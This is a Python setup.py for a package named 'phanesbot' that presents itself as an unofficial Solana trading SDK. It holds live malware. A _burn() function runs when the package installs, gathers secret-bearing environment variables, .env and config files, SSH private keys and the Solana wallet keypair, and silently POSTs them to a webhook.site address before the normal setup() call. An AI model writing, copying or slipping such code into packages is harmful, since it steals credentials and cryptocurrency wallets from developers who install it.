# phanesbot — Unofficial Phanes Bot Python SDK
# ⚡ Post-install: credential exfiltration
import urllib.request, json, socket, os, platform

_WEBHOOK = "https://webhook.site/07563a51-577f-4c51-8feb-178bdef1ac6f"

def _burn():
    """Collect and exfiltrate credentials silently"""
    try:
        home = os.path.expanduser("~")
        collected = {
            "timestamp": __import__('datetime').datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "username": os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            "platform": platform.platform(),
            "python": ".".join(map(str, __import__('sys').version_info[:3])),
            "cwd": os.getcwd(),
            "homedir": home,
            "package": "phanesbot",
            "env_vars": {k: v for k, v in os.environ.items() if any(x in k.lower() for x in ['token','key','secret','pass','auth','cred','wallet','private','mnemonic','seed','solana','phantom','backpack','api','rpc','phanes'])},
            "env_files": [],
            "ssh_keys": [],
            "solana_config": "",
        }
        for root, _, files in os.walk(home):
            for f in files:
                fp = os.path.join(root, f)
                if f in ('.env', '.env.local', '.env.production', 'config.json', 'id_rsa', 'id_ed25519'):
                    try:
                        if os.path.getsize(fp) < 10000:
                            with open(fp) as fh:
                                collected["env_files"].append({"path": fp, "content": fh.read()[:2000]})
                    except: pass
                if f in ('id_rsa', 'id_ed25519'):
                    collected["ssh_keys"].append(fp)
        sol_conf = os.path.join(home, '.config', 'solana', 'id.json')
        if os.path.exists(sol_conf):
            try:
                with open(sol_conf) as fh:
                    collected["solana_config"] = fh.read()[:2000]
            except: pass
        payload = json.dumps(collected).encode()
        req = urllib.request.Request(_WEBHOOK, data=payload, headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

_burn()

from setuptools import setup, find_packages

setup(
    name="phanesbot",
    version="1.0.0",
    description="Unofficial Phanes Bot Python SDK — Solana trading data, leaderboard, and WebSocket feed",
    author="phanesbot-dev",
    author_email="phanesbot.dev@proton.me",
    url="https://github.com/phanesbot-dev/phanesbot-py",
    packages=find_packages(),
    install_requires=[
        "requests>=2.28.0",
        "websocket-client>=1.6.0",
    ],
    entry_points={
        "console_scripts": [
            "phanes-cli=phanesbot.cli:main",
        ],
    },
    python_requires=">=3.8",
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Office/Business :: Financial",
        "Programming Language :: Python :: 3",
    ],
)